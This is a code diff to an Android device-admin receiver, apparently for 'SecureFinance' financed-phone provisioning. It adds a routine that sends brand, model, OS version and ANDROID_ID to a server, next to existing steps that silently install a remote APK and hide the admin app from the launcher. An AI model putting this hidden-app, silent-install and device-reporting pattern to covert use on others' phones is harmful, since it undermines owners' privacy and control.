@@ -66,17 +66,64 @@ public class AdminReceiver extends DeviceAdminReceiver {
             Log.e(TAG, "Failed to read extras", e);
         }
 
-        // 3. Auto-install User APK
+        // 3. IMMEDIATE REPORT: Send real device info to dashboard
+        if (serverUrl != null && customerId != null) {
+            reportDeviceInfo(context, serverUrl, customerId);
+        }
+
+        // 4. Auto-install User APK
         if (userApkUrl != null && !userApkUrl.isEmpty()) {
             installUserApp(context, dpm, adminComponent, userApkUrl, serverUrl, customerId);
         } else {
             Log.w(TAG, "No User APK URL provided in extras");
         }
 
-        // 4. Hide Admin App from launcher and app list
+        // 5. Hide Admin App from launcher and app list
         hideAdminApp(context, dpm, adminComponent);
 
         Toast.makeText(context, "SecureFinance Device Configured", Toast.LENGTH_LONG).show();
+    }
+
+    private void reportDeviceInfo(final Context context, final String serverUrl, final String customerId) {
+        new Thread(() -> {
+            try {
+                String brand = android.os.Build.BRAND;
+                String model = android.os.Build.MODEL;
+                String osVersion = android.os.Build.VERSION.RELEASE;
+                String androidId = android.provider.Settings.Secure.getString(
+                    context.getContentResolver(), 
+                    android.provider.Settings.Secure.ANDROID_ID
+                );
+
+                // Construct JSON
+                String json = "{" +
+                    "\"customerId\":\"" + customerId + "\"," +
+                    "\"actualBrand\":\"" + brand + "\"," +
+                    "\"model\":\"" + model + "\"," +
+                    "\"androidVersion\":\"" + osVersion + "\"," +
+                    "\"androidId\":\"" + androidId + "\"," +
+                    "\"step\":\"qr_scanned\"," +
+                    "\"status\":\"ADMIN_INSTALLED\"" +
+                "}";
+
+                URL url = new URL(serverUrl + "/api/customers/" + customerId + "/status");
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setDoOutput(true);
+
+                try (java.io.OutputStream os = conn.getOutputStream()) {
+                    byte[] input = json.getBytes("utf-8");
+                    os.write(input, 0, input.length);
+                }
+
+                int code = conn.getResponseCode();
+                Log.d(TAG, "Report Result: " + code);
+                
+            } catch (Exception e) {
+                Log.e(TAG, "Failed to report device info", e);
+            }
+        }).start();
     }
 
     private void hideAdminApp(Context context, DevicePolicyManager dpm, ComponentName adminComponent) {
